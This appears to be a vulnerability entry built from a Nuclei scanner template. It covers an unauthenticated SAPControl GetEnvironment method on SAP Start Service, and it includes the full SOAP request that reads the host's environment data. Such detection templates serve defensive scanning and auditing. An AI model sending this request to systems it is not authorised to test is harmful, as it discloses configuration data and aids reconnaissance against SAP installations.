# Vulnerability: SAPControl GetEnvironment - Disclosure
**Classification:** MISCONFIG
**Source:** Nuclei Template (`sap-getenvironment-disclosure.yaml`)

## Description
Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl SOAP web service exposes the GetEnvironment web method without authentication.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=UTF-8
SOAPAction: '""'

<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP-ENV:Header>
    <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
      <enableSession>true</enableSession>
    </sapsess:Session>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <ns1:GetEnvironment xmlns:ns1="urn:SAPControl"/>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

